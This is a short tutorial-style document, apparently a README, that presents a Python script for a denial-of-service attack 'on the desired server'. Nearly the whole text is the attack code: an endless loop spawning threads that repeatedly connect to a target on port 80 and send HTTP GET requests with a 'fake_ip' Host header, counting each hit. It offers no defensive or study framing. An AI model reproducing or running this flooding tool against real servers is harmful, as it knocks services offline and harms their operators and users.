# ddos
### A method for dos attack on the desired server

```

import socket # for connection

import threading # for Multitasking at the same time

```
### We start writing the rest of the tool code

# Setting up a fake IP and attacking the target host
‍‍‍‍```
‍‍‍‍import socket
import threading

target = '127.0.0.1' # target ip
fake_ip = '108.61.128.158'
port = 80

an = 0
def attack():
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target, port))
        client.sendto(("GET /" + target + " HTTP/2\r\n").encode('ascii'), (target, port))
        client.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global an
        an += 1
        print(an)
        
        client.close()

while True:
    thread = threading.Thread(target=attack)
    thread.start()
``
# Don't be disappointed
